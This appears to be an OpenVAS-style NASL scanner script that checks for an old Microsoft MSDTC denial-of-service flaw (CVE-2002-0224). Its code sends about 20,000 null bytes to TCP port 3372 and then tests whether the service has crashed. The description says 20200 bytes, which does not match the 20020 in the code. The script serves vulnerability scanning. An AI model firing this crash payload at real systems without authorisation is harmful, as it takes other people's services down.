# SPDX-FileCopyrightText: 2002 Michel Arboi
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.10939");
  script_version("2024-06-06T05:05:36+0000");
  script_tag(name:"last_modification", value:"2024-06-06 05:05:36 +0000 (Thu, 06 Jun 2024)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  # nb: CVE-2002-0224 is not listed on MS02-018 but the Bugtraq entry says:
  # > This was already corrected in MS02-018*snip*The security bulletin from Microsoft, however,
  # > does not mention this vulnerability.
  script_cve_id("CVE-2002-0224");
  script_name("Microsoft Distributed Transaction Coordinator (MSDTC) DoS Vulnerability (MS02-018) - Active Check");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2002 Michel Arboi");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/msdtc", 3372);

  script_xref(name:"URL", value:"https://learn.microsoft.com/en-us/security-updates/securitybulletins/2002/ms02-018");
  script_xref(name:"URL", value:"https://seclists.org/bugtraq/2002/Apr/290");
  script_xref(name:"URL", value:"https://web.archive.org/web/20210129090842/http://www.securityfocus.com/bid/4006");

  script_tag(name:"summary", value:"Microsoft Distributed Transaction Coordinator (MSDTC) is prone
  to a denial of service (DoS) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted TCP request and checks if the service is still
  responding.");

  script_tag(name:"insight", value:"It was possible to crash the MSDTC service by sending 20200 nul
  bytes.");

  script_tag(name:"solution", value:"The vendor has released updates. Please see the MS02-018
  bulletin for more information.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("port_service_func.inc");

port = service_get_port(default:3372, proto:"msdtc");

if(!soc = open_sock_tcp(port))
  exit(0);

zer = raw_string(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0); # 20020 = 20*1001
send(socket:soc, data:zer) x 1001;
close(soc);
sleep(2);

soc2 = open_sock_tcp(port);
if(!soc2) {
  security_message(port:port);
  exit(0);
}

exit(99);
